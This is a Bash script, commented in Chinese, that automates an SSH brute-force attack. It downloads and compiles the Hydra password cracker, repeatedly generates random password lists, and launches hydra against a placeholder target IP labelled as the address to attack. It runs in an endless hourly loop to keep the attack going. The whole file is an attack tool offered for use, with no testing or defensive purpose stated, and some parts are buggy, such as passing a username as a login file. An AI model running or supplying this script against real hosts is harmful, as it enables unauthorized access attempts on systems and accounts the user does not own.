#!/bin/bash

# 设置九头蛇路径
HYDRA_PATH="/usr/local/bin/hydra"

# 设置目标IP与端口
TARGET_IP="你要攻击的ip"
TARGET_PORT="22"

# 设置密码生成文件路径
PASSWORD_FILE="/tmp/passwords.txt"
PASSWORD_LOG="/tmp/hydra_log.txt"

# 设置日志文件最大大小为1MB
MAX_LOG_SIZE=1048576

# 设置密码生成规则
CHARSET="A-Za-z0-9!@#$%^&*()_+-=[]{}|;:,.<>?/"

# 设置九头蛇日志和配置路径
LOG_DIR="/var/log/hydra"
mkdir -p $LOG_DIR

# 密码生成函数
generate_passwords() {
    # 使用临时文件来存储生成的密码，确保不会重复
    TEMP_PASSWORD_FILE=$(mktemp)

    # 生成100个密码并输出到临时文件
    for i in {1..100}; do
        PASSWORD=$(cat /dev/urandom | tr -dc $CHARSET | fold -w $(($RANDOM % 8 + 5)) | head -n 1)
        echo $PASSWORD >> $TEMP_PASSWORD_FILE
    done

    # 将生成的密码追加到实际密码文件
    cat $TEMP_PASSWORD_FILE >> $PASSWORD_FILE

    # 删除临时文件
    rm $TEMP_PASSWORD_FILE
}

# 下载并安装 Hydra v9.0（如果没有安装）
download_hydra() {
    if ! command -v hydra &> /dev/null; then
        echo "Hydra未安装，正在安装v9.0版本..."
        # 下载 Hydra v9.0 版本
        wget https://github.com/vanhauser-thc/thc-hydra/archive/refs/tags/v9.0.tar.gz -P /tmp
        tar -zxvf /tmp/v9.0.tar.gz -C /tmp
        cd /tmp/thc-hydra-9.0  # 确保切换到正确目录

        # 安装必需的依赖库
        sudo apt-get install libssh-dev -y  # 确保安装了 libssh-dev（适用于 Ubuntu/Debian）
        
        # 配置并编译 Hydra
        ./configure --with-ssh
        if [ $? -ne 0 ]; then
            echo "Hydra 编译失败，检查错误信息！"
            exit 1
        fi
        
        make
        sudo make install
        echo "Hydra v9.0安装完成"
    else
        echo "Hydra已安装，检查更新..."
        # 不再使用 git，直接下载并解压新的版本，避免 git 错误
        wget https://github.com/vanhauser-thc/thc-hydra/archive/refs/tags/v9.0.tar.gz -P /tmp
        tar -zxvf /tmp/v9.0.tar.gz -C /tmp
        cd /tmp/thc-hydra-9.0
        make
        sudo make install
    fi
}

# 执行SSH爆破
run_hydra() {
    echo "开始执行Hydra爆破..."
    $HYDRA_PATH -L $USER -P $PASSWORD_FILE -t 4 ssh://$TARGET_IP:$TARGET_PORT >> $PASSWORD_LOG 2>&1
}

# 处理日志文件大小
check_log_size() {
    LOG_SIZE=$(stat -c %s "$PASSWORD_LOG")
    if [ $LOG_SIZE -ge $MAX_LOG_SIZE ]; then
        BACKUP_LOG="$LOG_DIR/hydra_log_$(date +%F_%T).txt"
        mv $PASSWORD_LOG $BACKUP_LOG
        echo "日志已备份到 $BACKUP_LOG"
        > $PASSWORD_LOG
        echo "创建新日志文件"
    fi
}

# 运行主流程
while true; do
    # 检查是否需要下载或更新九头蛇
    download_hydra

    # 生成密码
    generate_passwords

    # 执行SSH爆破
    run_hydra

    # 检查日志文件大小
    check_log_size

    # 每隔1小时生成新的密码，保持爆破持续
    sleep 3600
done